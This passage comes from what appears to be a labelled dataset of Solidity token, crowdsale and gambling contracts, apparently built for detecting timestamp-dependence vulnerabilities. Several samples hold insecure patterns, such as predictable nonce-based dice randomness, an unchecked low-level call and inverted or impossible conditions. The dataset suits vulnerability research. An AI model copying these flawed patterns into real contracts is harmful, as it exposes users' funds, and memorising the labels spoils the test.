State.Completed;            endAt = block.timestamp;            emit ICOCompleted(collectedWei);        } else if (block.timestamp >= endAt) {            if (collectedWei < lowCapWei) {                state = State.NotCompleted;                emit ICONotCompleted();            } else {                state = State.Completed;                emit ICOCompleted(collectedWei);            }        }    }    function buyTokens() public onlyWhitelisted payable {        require(state == State.Active &&            block.timestamp <= endAt &&            msg.value >= lowCapTxWei &&            msg.value <= hardCapTxWei &&            collectedWei + msg.value <= hardCapWei);        uint amountWei = msg.value;                 if (block.timestamp <= personalCapEndAt) {            personalPurchases[msg.sender] = personalPurchases[msg.sender].add(amountWei);            require(personalPurchases[msg.sender] <= PERSONAL_CAP);        }        uint itokens = amountWei.mul(ETH_TOKEN_EXCHANGE_RATIO).mul(ONE_TOKEN).div(1 ether);        collectedWei = collectedWei.add(amountWei);        emit ICOInvestment(msg.sender, amountWei, itokens, 0);                 token.transferFrom(tokenHolder, msg.sender, itokens);        forwardFunds();        touch();    }}
0<CODESPLIT>contract GambioToken is CappedToken {  using SafeMath for uint256;  string public name = "GMB";  string public symbol = "GMB";  uint8 public decimals = 18;  event Burn(address indexed burner, uint256 value);  event BurnTransferred(address indexed previousBurner, address indexed newBurner);  address burnerRole;  modifier onlyBurner() {    require(msg.sender == burnerRole);    _;  }  constructor(address _burner, uint256 _cap) public CappedToken(_cap) {    burnerRole = _burner;  }  function transferBurnRole(address newBurner) public onlyBurner {    require(newBurner != address(0));    emit BurnTransferred(burnerRole, newBurner);    burnerRole = newBurner;  }  function burn(uint256 _value) public onlyBurner {    require(_value <= balances[msg.sender]);    balances[msg.sender] = balances[msg.sender].sub(_value);    totalSupply_ = totalSupply_.sub(_value);    emit Burn(msg.sender, _value);    emit Transfer(msg.sender, address(0), _value);  }} 
1<CODESPLIT>contract GambioVesting is TokenVesting {  using SafeMath for uint256;  uint256 public previousRelease;  uint256 period;  constructor(uint256 _period, address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, bool _revocable)  public  TokenVesting(_beneficiary, _start, _cliff, _duration, _revocable) {         period = _period;    previousRelease = now;  }     function release(ERC20Basic token) public {    require(now >= previousRelease.add(period));    uint256 unreleased = releasableAmount(token);    require(unreleased > 0);    released[token] = released[token].add(unreleased);    token.safeTransfer(beneficiary, unreleased);    previousRelease = now;    emit Released(unreleased);  }} 
1<CODESPLIT>contract GambioCrowdsale is CappedCrowdsale, OnlyWhiteListedAddresses {  using SafeMath for uint256;  struct TokenPurchaseRecord {    uint256 timestamp;    uint256 weiAmount;    address beneficiary;  }  uint256 transactionId = 1;  mapping(uint256 => TokenPurchaseRecord) pendingTransactions;  mapping(uint256 => bool) completedTransactions;  uint256 public referralPercentage;  uint256 public individualCap;     event TokenPurchaseRequest(    uint256 indexed transactionId,    address beneficiary,    uint256 indexed timestamp,    uint256 indexed weiAmount,    uint256 tokensAmount  );  event ReferralTokensSent(    address indexed beneficiary,    uint256 indexed tokensAmount,    uint256 indexed transactionId  );  event BonusTokensSent(    address indexed beneficiary,    uint256 indexed tokensAmount,    uint256 indexed transactionId  );  constructor(    uint256 _startTime,    uint256 _endTime,    uint256 _icoHardCapWei,    uint256 _referralPercentage,    uint256 _rate,    address _wallet,    uint256 _privateWeiRaised,    uint256 _individualCap,    address _utilityAccount,    uint256 _tokenCap,    uint256[] _vestingData  )  public  OnlyWhiteListedAddresses(_utilityAccount)  CappedCrowdsale(_icoHardCapWei, _vestingData, _wallet)  Crowdsale(_startTime, _endTime, _rate, _wallet, _privateWeiRaised, _tokenCap)  {    referralPercentage = _referralPercentage;    individualCap = _individualCap;  }     function() external payable {    buyTokens(msg.sender);  }     function buyTokens(address beneficiary) public payable {    require(!isFinalized);    require(beneficiary == msg.sender);    require(msg.value != 0);    require(msg.value >= individualCap);    uint256 weiAmount = msg.value;    require(isWhiteListedAddress(beneficiary));    require(validPurchase(weiAmount));         weiRaised = weiRaised.add(weiAmount);    uint256 _transactionId = transactionId;    uint256 tokensAmount = weiAmount.mul(rate);    pendingTransactions[_transactionId] = TokenPurchaseRecord(now, weiAmount, beneficiary);    transactionId += 1;    emit TokenPurchaseRequest(_transactionId, beneficiary, now, weiAmount, tokensAmount);    forwardFunds();  }  function delayIcoEnd(uint256 newDate) public onlyOwner {    require(newDate != 0);    require(newDate > now);    require(!hasEnded());    require(newDate > endTime);    endTime = newDate;  }  function increaseWeiRaised(uint256 amount) public onlyOwner {    require(now < startTime);    require(amount > 0);    require(weiRaised.add(amount) <= hardCap);    weiRaised = weiRaised.add(amount);  }  function decreaseWeiRaised(uint256 amount) public onlyOwner {    require(now < startTime);    require(amount > 0);    require(weiRaised > 0);    require(weiRaised >= amount);    weiRaised = weiRaised.sub(amount);  }  function issueTokensMultiple(uint256[] _transactionIds, uint256[] bonusTokensAmounts) public onlyOwner {    require(isFinalized);    require(_transactionIds.length == bonusTokensAmounts.length);    for (uint i = 0; i < _transactionIds.length; i++) {      issueTokens(_transactionIds[i], bonusTokensAmounts[i]);    }  }  function issueTokens(uint256 _transactionId, uint256 bonusTokensAmount) internal {    require(completedTransactions[_transactionId] != true);    require(pendingTransactions[_transactionId].timestamp != 0);    TokenPurchaseRecord memory record = pendingTransactions[_transactionId];    uint256 tokens = record.weiAmount.mul(rate);    address referralAddress = referrals[record.beneficiary];    token.mint(record.beneficiary, tokens);    emit TokenPurchase(record.beneficiary, record.weiAmount, tokens, _transactionId);    completedTransactions[_transactionId] = true;    if (bonusTokensAmount != 0) {      require(bonusTokensAmount != 0);      token.mint(record.beneficiary, bonusTokensAmount);      emit BonusTokensSent(record.beneficiary, bonusTokensAmount, _transactionId);    }    if (referralAddress != address(0)) {      uint256 referralAmount = tokens.mul(referralPercentage).div(uint256(100));      token.mint(referralAddress, referralAmount);      emit ReferralTokensSent(referralAddress, referralAmount, _transactionId);    }  }  function validPurchase(uint256 weiAmount) internal view returns (bool) {    bool withinCap = weiRaised.add(weiAmount) <= hardCap;    bool withinCrowdsaleInterval = now >= startTime && now <= endTime;    return withinCrowdsaleInterval && withinCap;  }  function forwardFunds() internal {    wallet.transfer(msg.value);  }} 
1<CODESPLIT>contract UniswapV2Pair {    uint32  private blockTimestampLast;      uint public price0CumulativeLast;    uint public price1CumulativeLast;    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {        uint32 blockTimestamp = uint32(block.timestamp % 2**32);        uint32 timeElapsed = blockTimestamp - blockTimestampLast;        if (timeElapsed > 0 ) {            price0CumulativeLast += _reserve0 * timeElapsed;            price1CumulativeLast += _reserve1 * timeElapsed;        }    }}
1<CODESPLIT>contract wbcSale {    function blockTime() public view returns (uint32) {        return uint32(block.timestamp);    }}
1<CODESPLIT>contract OdinToken {    struct balanceData {         uint balance;    }    mapping(address => balanceData) balances;    function canSpend(address tokenOwner, uint _value) public constant returns (bool success) {        if (block.timestamp < 1569974400 && (balances[tokenOwner].balance - _value) < 4) {            return false;        }        return true;    }}
0<CODESPLIT>contract BonusToken is BurnableToken, Operational, StandardToken {    using SafeMath for uint;    using DateTime for uint256;    uint256 public createTime;    uint256 standardDecimals = 100000000;    uint256 minMakeBonusAmount = standardDecimals.mul(10);    function BonusToken() public Operational(msg.sender) {}    function makeBonus(address[] _to, uint256[] _bonus) public returns(bool) {        for(uint i = 0; i < _to.length; i++){            require(transfer(_to[i], _bonus[i]));        }        return true;    }}
1<CODESPLIT>contract KuaiMintableToken is BonusToken {    uint256 public standardDailyLimit; // maximum amount of token can mint per day    uint256 public dailyLimitLeft = standardDecimals.mul(1000000); // daily limit left    uint256 public lastMintTime = 0;    event Mint(address indexed operator, uint256 value, uint256 mintTime);    event SetDailyLimit(address indexed operator, uint256 time);    function KuaiMintableToken(                    address _owner,                    uint256 _dailyLimit                ) public BonusToken() {        totalSupply_ = 0;        createTime = block.timestamp;        lastMintTime = createTime;        owner = _owner;        standardDailyLimit = standardDecimals.mul(_dailyLimit);        dailyLimitLeft = standardDailyLimit;    }    function mint(uint256 mintAmount) public onlyOperator returns(uint256 _actualRelease) {        uint256 timestamp = block.timestamp;        require(!judgeIsReachDailyLimit(mintAmount, timestamp));        balances[owner] = balances[owner].add(mintAmount);        totalSupply_ = totalSupply_.add(mintAmount);        emit Mint(msg.sender, mintAmount, timestamp);        emit Transfer(address(0), owner, mintAmount);        return mintAmount;    }    function judgeIsReachDailyLimit(uint256 mintAmount, uint256 timestamp) internal returns(bool _exist) {        bool reached = false;        if ((timestamp.parseTimestamp().year == lastMintTime.parseTimestamp().year)            && (timestamp.parseTimestamp().month == lastMintTime.parseTimestamp().month)            && (timestamp.parseTimestamp().day == lastMintTime.parseTimestamp().day)) {            if (dailyLimitLeft < mintAmount) {                reached = true;            } else {                dailyLimitLeft = dailyLimitLeft.sub(mintAmount);                lastMintTime = timestamp;            }        } else {            dailyLimitLeft = standardDailyLimit;            lastMintTime = timestamp;            if (dailyLimitLeft < mintAmount) {                reached = true;            } else {                dailyLimitLeft = dailyLimitLeft.sub(mintAmount);            }        }        return reached;    }    function setDailyLimit(uint256 _dailyLimit) public onlyOwner returns(bool){        standardDailyLimit = _dailyLimit;        emit SetDailyLimit(msg.sender, block.timestamp);        return true;    }}
0<CODESPLIT>contract KuaiToken is KuaiMintableToken {    string public standard = '20180609';    string public name = 'KuaiToken';    string public symbol = 'KT';    uint8 public decimals = 8;    function KuaiToken(                    address _owner,                    uint256 dailyLimit                     ) public KuaiMintableToken(_owner, dailyLimit) {}}
1<CODESPLIT>contract BlocklancerToken {    uint public fundingStart;    function TimeLeftBeforeCrowdsale() external constant returns (uint256) {        if(fundingStart > block.timestamp)            return fundingStart;        else            return 0;    }}
1<CODESPLIT>contract Omnipurse {  struct Contribution {    address sender;    uint value;    bool refunded;    uint256 timestamp;  }  struct Purse {    uint8 status;    uint numContributions;    mapping (uint => Contribution) contributions;  }  mapping (uint => Purse) purses;  function contributeToPurse(uint purseId) payable {    Purse p = purses[purseId];    if (p.status != 1) { throw; }    p.contributions[p.numContributions++] = Contribution(msg.sender, msg.value, false, block.timestamp);    return;  }}
0<CODESPLIT>contract ERC721 {  event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);  event Approval(address indexed _owner, address indexed _approved, uint256 _tokenId);  function balanceOf(address _owner) public view returns (uint256 _balance);  function ownerOf(uint256 _tokenId) public view returns (address _owner);  function transfer(address _to, uint256 _tokenId) public;  function approve(address _to, uint256 _tokenId) public;  function takeOwnership(uint256 _tokenId) public;}
0<CODESPLIT>contract Economeme is ERC721, Ownable {  using SafeMath for uint256;  uint256 private totalTokens;  uint256 public developerCut;  uint256 public submissionPool; // The fund amount gained from submissions.  uint256 public submissionPrice; // How much it costs to submit a meme.  uint256 public endingBalance; // Balance at the end of the last purchase.  mapping (uint256 => Meme) public memeData;  mapping (uint256 => address) private tokenOwner;  mapping (uint256 => address) private tokenApprovals;  mapping (address => uint256[]) private ownedTokens;  mapping(uint256 => uint256) private ownedTokensIndex;  mapping (address => uint256) public creatorBalances;  event Purchase(uint256 indexed _tokenId, address indexed _buyer, address indexed _seller, uint256 _purchasePrice);  event Creation(address indexed _creator, uint256 _tokenId, uint256 _timestamp);  uint256 private firstCap  = 0.02 ether;  uint256 private secondCap = 0.5 ether;  uint256 private thirdCap  = 2.0 ether;  uint256 private finalCap  = 5.0 ether;  struct Meme {    uint256 price;         // Current price of the item.    address owner;         // Current owner of the item.    address creator;       // Address that created dat boi.  }    function Economeme() public {    submissionPrice = 1 ether / 100;  }  function buyToken(uint256 _tokenId) public     payable  {    Meme storage meme = memeData[_tokenId];    uint256 price = meme.price;    address oldOwner = meme.owner;    address newOwner = msg.sender;    uint256 excess = msg.value.sub(price);    require(price > 0);    require(msg.value >= price);    require(oldOwner != msg.sender);        uint256 devCut = price.mul(2).div(100);    developerCut = developerCut.add(devCut);    uint256 creatorCut = price.mul(2).div(100);    creatorBalances[meme.creator] = creatorBalances[meme.creator].add(creatorCut);    uint256 transferAmount = price.sub(creatorCut + devCut);    transferToken(oldOwner, newOwner, _tokenId);    emit Purchase(_tokenId, newOwner, oldOwner, price);    meme.price = getNextPrice(price);    safeTransfer(oldOwner, transferAmount);        if (excess > 0) {      newOwner.transfer(excess);    }        if (address(this).balance > endingBalance + creatorCut + devCut) submissionPool += transferAmount;        endingBalance = address(this).balance;  }  function safeTransfer(address _oldOwner, uint256 _amount) internal {     assembly {         let x := mload(0x40)         let success := call(            5000,             _oldOwner,             _amount,             x,             0x0,             x,             0x20)         mstore(0x40,add(x,0x20))     }   }  function transferToken(address _from, address _to, uint256 _tokenId) internal {    require(tokenExists(_tokenId));    require(memeData[_tokenId].owner == _from);    require(_to != address(0));    require(_to != address(this));    clearApproval(_from, _tokenId);    removeToken(_from, _tokenId);    addToken(_to, _tokenId);    emit Transfer(_from, _to, _tokenId);  }    function getNextPrice (uint256 _price) internal view returns (uint256 _nextPrice) {    if (_price < firstCap) {      return _price.mul(200).div(95);    } else if (_price < secondCap) {      return _price.mul(135).div(96);    } else if (_price < thirdCap) {      return _price.mul(125).div(97);    } else if (_price < finalCap) {      return _price.mul(117).div(97);    } else {      return _price.mul(115).div(98);    }  }  function createToken() external payable {    uint256 tokenId = totalTokens + 1;    require(memeData[tokenId].price == 0);    require(msg.value == submissionPrice);    submissionPool += submissionPrice;    endingBalance = address(this).balance;        memeData[tokenId] = Meme(1 ether / 100, msg.sender, msg.sender);    _mint(msg.sender, tokenId);        emit Creation(msg.sender, tokenId, block.timestamp);  }  function withdrawBalance(address _beneficiary) external {    uint256 payout = creatorBalances[_beneficiary];    creatorBalances[_beneficiary] = 0;    _beneficiary.transfer(payout);    endingBalance = address(this).balance;  }  function getMemeData (uint256 _tokenId) external view   returns (address _owner, uint256 _price, uint256 _nextPrice, address _creator)   {    Meme memory meme = memeData[_tokenId];    return (meme.owner, meme.price, getNextPrice(meme.price), meme.creator);  }  function checkBalance(address _owner) external view returns (uint256) {    return creatorBalances[_owner];  }  function tokenExists (uint256 _tokenId) public view returns (bool _exists) {    return memeData[_tokenId].price > 0;  }      function withdraw(uint256 _devAmount, uint256 _submissionAmount) public onlyAdmin() {    if (_devAmount == 0) {       _devAmount = developerCut;     }    if (_submissionAmount == 0) {      _submissionAmount = submissionPool;    }    developerCut = developerCut.sub(_devAmount);    submissionPool = submissionPool.sub(_submissionAmount);    owner.transfer(_devAmount + _submissionAmount);    endingBalance = address(this).balance;  }  function refundSubmission(address _refundee, uint256 _amount) external onlyAdmin() {    submissionPool = submissionPool.sub(_amount);    _refundee.transfer(_amount);    endingBalance = address(this).balance;  }    function refundByToken(uint256 _tokenId) external onlyAdmin() {    submissionPool = submissionPool.sub(submissionPrice);    memeData[_tokenId].creator.transfer(submissionPrice);    endingBalance = address(this).balance;  }  function changeSubmissionPrice(uint256 _newPrice) external onlyAdmin() {    submissionPrice = _newPrice;  }  modifier onlyOwnerOf(uint256 _tokenId) {    require(ownerOf(_tokenId) == msg.sender);    _;  }  function totalSupply() public view returns (uint256) {    return totalTokens;  }  function balanceOf(address _owner) public view returns (uint256) {    return ownedTokens[_owner].length;  }  function tokensOf(address _owner) public view returns (uint256[]) {    return ownedTokens[_owner];  }  function ownerOf(uint256 _tokenId) public view returns (address) {    address owner = tokenOwner[_tokenId];    return owner;  }  function approvedFor(uint256 _tokenId) public view returns (address) {    return tokenApprovals[_tokenId];  }  function transfer(address _to, uint256 _tokenId) public onlyOwnerOf(_tokenId) {    clearApprovalAndTransfer(msg.sender, _to, _tokenId);  }  function approve(address _to, uint256 _tokenId) public onlyOwnerOf(_tokenId) {    address owner = ownerOf(_tokenId);    require(_to != owner);    if (approvedFor(_tokenId) != 0 || _to != 0) {      tokenApprovals[_tokenId] = _to;      emit Approval(owner, _to, _tokenId);    }  }  function takeOwnership(uint256 _tokenId) public {    require(isApprovedFor(msg.sender, _tokenId));    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);  }  function isApprovedFor(address _owner, uint256 _tokenId) internal view returns (bool) {    return approvedFor(_tokenId) == _owner;  }    function clearApprovalAndTransfer(address _from, address _to, uint256 _tokenId) internal {    require(_to != address(0));    require(_to != ownerOf(_tokenId));    require(ownerOf(_tokenId) == _from);    clearApproval(_from, _tokenId);    removeToken(_from, _tokenId);    addToken(_to, _tokenId);    emit Transfer(_from, _to, _tokenId);  }  function clearApproval(address _owner, uint256 _tokenId) private {    require(ownerOf(_tokenId) == _owner);    tokenApprovals[_tokenId] = 0;    emit Approval(_owner, 0, _tokenId);  }  function _mint(address _to, uint256 _tokenId) internal {    addToken(_to, _tokenId);    emit Transfer(0x0, _to, _tokenId);  }  function addToken(address _to, uint256 _tokenId) private {    require(tokenOwner[_tokenId] == address(0));    tokenOwner[_tokenId] = _to;    memeData[_tokenId].owner = _to;        uint256 length = balanceOf(_to);    ownedTokens[_to].push(_tokenId);    ownedTokensIndex[_tokenId] = length;    totalTokens = totalTokens.add(1);  }  function removeToken(address _from, uint256 _tokenId) private {    require(ownerOf(_tokenId) == _from);    uint256 tokenIndex = ownedTokensIndex[_tokenId];    uint256 lastTokenIndex = balanceOf(_from).sub(1);    uint256 lastToken = ownedTokens[_from][lastTokenIndex];    tokenOwner[_tokenId] = 0;    ownedTokens[_from][tokenIndex] = lastToken;    ownedTokens[_from][lastTokenIndex] = 0;    ownedTokens[_from].length--;    ownedTokensIndex[_tokenId] = 0;    ownedTokensIndex[lastToken] = tokenIndex;    totalTokens = totalTokens.sub(1);  }  function name() public pure returns (string _name) {    return "Economeme Meme";  }  function symbol() public pure returns (string _symbol) {    return "ECME";  }}
1<CODESPLIT>contract LightOracle{    address public provider1;    address public provider2;    uint256 public updateTimestamp;    function updateRate(uint256 _rate) public {        require(msg.sender == provider1 || msg.sender == provider2);        updateTimestamp = block.timestamp;        return;    }}
1<CODESPLIT>contract IncreasingTokenPriceCrowdsale {  uint256 public openingTime = 10;     function getCurrentRate() public view returns (uint256) {    uint256 elapsedTime = block.timestamp - (openingTime);    return elapsedTime;  }}
0<CODESPLIT>contract esToken is OwnableToken, BurnableToken, StandardToken {	string public name;	string public symbol;	uint8 public decimals;	bool public paused = true;	mapping(address => bool) public whitelist;	modifier whenNotPaused() {		require(!paused || whitelist[msg.sender]);		_;	}	constructor(string _name,string _symbol,uint8 _decimals, address holder, address buffer) public {		name = _name;		symbol = _symbol;		decimals = _decimals;		Transfer(address(0), holder, balances[holder] = totalSupply_ = uint256(10)**(9 + decimals));		addToWhitelist(holder);		addToWhitelist(buffer);	}	function unpause() public onlyOwner {		paused = false;	}	function pause() public onlyOwner {		paused = true;	}	function addToWhitelist(address addr) public onlyOwner {		whitelist[addr] = true;	}    	function removeFromWhitelist(address addr) public onlyOwner {		whitelist[addr] = false;	}	function transfer(address to, uint256 value) public whenNotPaused returns (bool) {		return super.transfer(to, value);	}	function transferFrom(address from, address to, uint256 value) public whenNotPaused returns (bool) {		return super.transferFrom(from, to, value);	}}
0<CODESPLIT>contract esCrowdsale is CappedCrowdsale, RefundableCrowdsale {  constructor(    uint256 _openingTime,    uint256 _closingTime,    uint256 _rate,    address _wallet,    uint256 _cap,    ERC20 _token,    uint256 _goal  )    public    Crowdsale(_rate, _wallet, _token)    CappedCrowdsale(_cap)    TimedCrowdsale(_openingTime, _closingTime)    RefundableCrowdsale(_goal)  {    require(_goal <= _cap);  }}
1<CODESPLIT>contract DiceForSlice is Ownable {    event UserBet       (address user, uint8 number1, uint8 number2, uint8 number3, uint8 number4, uint8 number5);    event DiceRoll      (uint8 number1, uint8 number2, uint8 number3, uint8 number4, uint8 number5);    event Loser         (address loser);    event WeHaveAWinner (address winner, uint256 amount);    event OMGItIsJackPot(address winner);    mapping(address => uint256) private bets;    address private sponsor;    uint256 private sponsorDiff  = 100000000000000000;    uint256 public sponsorValue  = 0;    uint256 private nonce        = 1;    uint256 public bank          = 0;    uint256 public stock         = 0;    uint256 private betPrice     = 500000000000000000;    uint8   private partBank     = 55;    uint8   private partOwner    = 20;    uint8   private partSponsor  = 12;    uint8   private partStock    = 10;    uint8   private partReferral = 3;    uint8   private rewardOne    = 10;    uint8   private rewardTwo    = 20;    uint8   private rewardThree  = 30;    uint8   private rewardFour   = 50;    uint8   private jackPot      = 100;    uint8   private minNumber    = 1;    uint8   private maxNumber    = 6;    modifier isValidBet(uint8 reward) {        require(msg.value == Math.percent(betPrice, reward));        _;    }    modifier bankNotEmpty() {        require(bank >= Math.percent(betPrice, rewardTwo));        require(address(this).balance >= bank);        _;    }    function fillTheBank() external payable {        require(msg.value >= sponsorDiff);        if (msg.value >= sponsorValue + sponsorDiff) {            sponsorValue = msg.value;            sponsor      = msg.sender;        }        bank = Math.add(bank, msg.value);    }    function appendStock(uint256 amount) external onlyOwner {        require(amount > 0);        require(stock >= amount);        bank  = Math.add(bank,  amount);        stock = Math.sub(stock, amount);    }    function getBalance() public view returns(uint256) {        return address(this).balance;    }    function getRN() internal returns(uint8) {        nonce++;        return uint8(Math.random(nonce, minNumber, maxNumber + minNumber));    }    function isValidNumber(uint8 number) internal view returns(bool) {        return number >= minNumber && number <= maxNumber;    }    function splitTheBet(address referral) internal {        uint256 _partBank     = Math.percent(msg.value, partBank);        uint256 _partOwner    = Math.percent(msg.value, partOwner);        uint256 _partStock    = Math.percent(msg.value, partStock);        uint256 _partSponsor  = Math.percent(msg.value, partSponsor);        uint256 _partReferral = Math.percent(msg.value, partReferral);                bank  = Math.add(bank,  _partBank);        stock = Math.add(stock, _partStock);        owner.transfer(_partOwner);        sponsor.transfer(_partSponsor);        if (referral != address(0) && referral != msg.sender && bets[referral] > 0) {            referral.transfer(_partReferral);        } else {            stock = Math.add(stock, _partReferral);        }    }    function isWinner(uint8 required, uint8[5] numbers, uint8[5] randoms) internal pure returns(bool) {        uint8 count = 0;        for (uint8 i = 0; i < numbers.length; i++) {            if (numbers[i] == 0) continue;            for (uint8 j = 0; j < randoms.length; j++) {                if (randoms[j] == 0) continue;                if (randoms[j] == numbers[i]) {                    count++;                    delete randoms[j];                    break;                }            }        }        return count == required;    }    function rewardTheWinner(uint8 reward) internal {        uint256 rewardValue = Math.percent(bank, reward);        require(rewardValue <= getBalance());        require(rewardValue <= bank);        bank = Math.sub(bank, rewardValue);        msg.sender.transfer(rewardValue);        emit WeHaveAWinner(msg.sender, rewardValue);    }    function rollOne(address referral, uint8 number)    external payable isValidBet(rewardOne) bankNotEmpty {        require(isValidNumber(number));               bets[msg.sender]++;        splitTheBet(referral);        uint8[5] memory numbers = [number,  0, 0, 0, 0];        uint8[5] memory randoms = [getRN(), 0, 0, 0, 0];        emit UserBet(msg.sender, number, 0, 0, 0, 0);        emit DiceRoll(randoms[0], 0, 0, 0, 0);        if (isWinner(1, numbers, randoms)) {            rewardTheWinner(rewardOne);        } else {            emit Loser(msg.sender);        }    }    function rollTwo(address referral, uint8 number1, uint8 number2)    external payable isValidBet(rewardTwo) bankNotEmpty {        require(isValidNumber(number1) && isValidNumber(number2));        bets[msg.sender]++;        splitTheBet(referral);        uint8[5] memory numbers = [number1, number2, 0, 0, 0];        uint8[5] memory randoms = [getRN(), getRN(), 0, 0, 0];        emit UserBet(msg.sender, number1, number2, 0, 0, 0);        emit DiceRoll(randoms[0], randoms[1], 0, 0, 0);        if (isWinner(2, numbers, randoms)) {            rewardTheWinner(rewardTwo);        } else {            emit Loser(msg.sender);        }    }    function rollThree(address referral, uint8 number1, uint8 number2, uint8 number3)    external payable isValidBet(rewardThree) bankNotEmpty {        require(isValidNumber(number1) && isValidNumber(number2) && isValidNumber(number3));        bets[msg.sender]++;        splitTheBet(referral);        uint8[5] memory numbers = [number1, number2, number3, 0, 0];        uint8[5] memory randoms = [getRN(), getRN(), getRN(), 0, 0];        emit UserBet(msg.sender, number1, number2, number3, 0, 0);        emit DiceRoll(randoms[0], randoms[1], randoms[2], 0, 0);        if (isWinner(3, numbers, randoms)) {            rewardTheWinner(rewardThree);        } else {            emit Loser(msg.sender);        }    }    function rollFour(address referral, uint8 number1, uint8 number2, uint8 number3, uint8 number4)    external payable isValidBet(rewardFour) bankNotEmpty {        require(isValidNumber(number1) && isValidNumber(number2) && isValidNumber(number3) && isValidNumber(number4));        bets[msg.sender]++;        splitTheBet(referral);        uint8[5] memory numbers = [number1, number2, number3, number4, 0];        uint8[5] memory randoms = [getRN(), getRN(), getRN(), getRN(), 0];        emit UserBet(msg.sender, number1, number2, number3, number4, 0);        emit DiceRoll(randoms[0], randoms[1], randoms[2], randoms[3], 0);        if (isWinner(4, numbers, randoms)) {            rewardTheWinner(rewardFour);        } else {            emit Loser(msg.sender);        }    }    function rollFive(address referral, uint8 number1, uint8 number2, uint8 number3, uint8 number4, uint8 number5)    external payable isValidBet(jackPot) bankNotEmpty {        require(isValidNumber(number1) && isValidNumber(number2) && isValidNumber(number3) && isValidNumber(number4) && isValidNumber(number5));        bets[msg.sender]++;        splitTheBet(referral);        uint8[5] memory numbers = [number1, number2, number3, number4, number5];        uint8[5] memory randoms = [getRN(), getRN(), getRN(), getRN(), getRN()];        emit UserBet(msg.sender, number1, number2, number3, number4, number5);        emit DiceRoll(randoms[0], randoms[1], randoms[2], randoms[3], randoms[4]);        if (isWinner(5, numbers, randoms)) {            rewardTheWinner(jackPot);            emit OMGItIsJackPot(msg.sender);        } else {            emit Loser(msg.sender);        }    }}
0<CODESPLIT>contract CryptoAssetCrowdsale is TimedCrowdsale, MintedCrowdsale,EscrowAccountCrowdsale,PostDeliveryCrowdsale { enum Stage {PROCESS1_FAILED, PROCESS1_SUCCESS,PROCESS2_FAILED, PROCESS2_SUCCESS,PROCESS3_FAILED, PROCESS3_SUCCESS} 		enum Phase {PHASE1, PHASE2,PHASE3}	Phase public phase;   struct whitelisted{       Stage  stage; }  uint256 public adminCharge_p1=0.010 ether;  uint256 public adminCharge_p2=0.13 ether;  uint256 public adminCharge_p3=0.14 ether;  uint256 public cap=750 ether;// softcap is 750 ether  uint256 public goal=4500 ether;// hardcap is 4500 ether  uint256 public minContribAmount = 0.1 ether; // min invesment  mapping(address => whitelisted) public whitelist;  mapping (address => uint256) public investedAmountOf;  uint256 public investorCount;  uint256 public constant DECIMALFACTOR = 10**uint256(18);  event updateRate(uint256 tokenRate, uint256 time);     function CryptoAssetCrowdsale(uint256 _starttime, uint256 _endTime, uint256 _rate, address _wallet,ERC20 _token)  TimedCrowdsale(_starttime,_endTime)Crowdsale(_rate, _wallet,_token)  {      phase = Phase.PHASE1;  }      function () external payable {    buyTokens(msg.sender);  }    function buyTokens(address _beneficiary) public payable onlyWhileOpen{    require(_beneficiary != address(0));    require(validPurchase());      uint256 weiAmount = msg.value;    uint256 tokens = weiAmount.mul(rate);    uint256 volumebasedBonus=0;    if(phase == Phase.PHASE1){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase1(tokens)).div(100);    }else if(phase == Phase.PHASE2){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase2(tokens)).div(100);    }else{    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase3(tokens)).div(100);    }    tokens=tokens.add(volumebasedBonus);    _preValidatePurchase( _beneficiary,  weiAmount);    weiRaised = weiRaised.add(weiAmount);    _processPurchase(_beneficiary, tokens);    emit TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);    _forwardFunds();    if(investedAmountOf[msg.sender] == 0) {           investorCount++;        }        investedAmountOf[msg.sender] = investedAmountOf[msg.sender].add(weiAmount);  }    function tokensaleToOtherCoinUser(address beneficiary, uint256 weiAmount) public onlyOwner onlyWhileOpen {    require(beneficiary != address(0) && weiAmount > 0);    uint256 tokens = weiAmount.mul(rate);    uint256 volumebasedBonus=0;    if(phase == Phase.PHASE1){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase1(tokens)).div(100);    }else if(phase == Phase.PHASE2){    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase2(tokens)).div(100);    }else{    volumebasedBonus = tokens.mul(getTokenVolumebasedBonusRateForPhase3(tokens)).div(100);    }    tokens=tokens.add(volumebasedBonus);    weiRaised = weiRaised.add(weiAmount);    _processPurchase(beneficiary, tokens);    emit TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);    }        function validPurchase() internal constant returns (bool) {    bool minContribution = minContribAmount <= msg.value;    return  minContribution;  }      function getTokenVolumebasedBonusRateForPhase1(uint256 value) internal constant returns (uint256) {        uint256 bonusRate = 0;        uint256 valume = value.div(DECIMALFACTOR);        if (valume <= 50000 && valume >= 149999) {            bonusRate = 30;        } else if (valume <= 150000 && valume >= 299999) {            bonusRate = 35;        } else if (valume <= 300000 && valume >= 500000) {            bonusRate = 40;        } else{            bonusRate = 25;        }        return bonusRate;    }     function getTokenVolumebasedBonusRateForPhase2(uint256 value) internal constant returns (uint256) {        uint256 bonusRate = 0;        uint valume = value.div(DECIMALFACTOR);        if (valume <= 50000 && valume >= 149999) {            bonusRate = 25;        } else if (valume <= 150000 && valume >= 299999) {            bonusRate = 30;        } else if (valume <= 300000 && valume >= 500000) {            bonusRate = 35;        } else{            bonusRate = 20;        }        return bonusRate;    }         function getTokenVolumebasedBonusRateForPhase3(uint256 value) internal constant returns (uint256) {        uint256 bonusRate = 0;        uint valume = value.div(DECIMALFACTOR);        if (valume <= 50000 && valume >= 149999) {            bonusRate = 20;        } else if (valume <= 150000 && valume >= 299999) {            bonusRate = 25;        } else if (valume <= 300000 && valume >= 500000) {            bonusRate = 30;        } else{            bonusRate = 15;        }        return bonusRate;    }    	function startPhase2(uint256 _startTime) public onlyOwner {      	require(_startTime>0);      	phase = Phase.PHASE2;      	openingTime=_startTime;         }     	function startPhase3(uint256 _startTime) public onlyOwner {      	require(0> _startTime);      	phase = Phase.PHASE3;        openingTime=_startTime;   }  modifier isWhitelisted(address _beneficiary) {    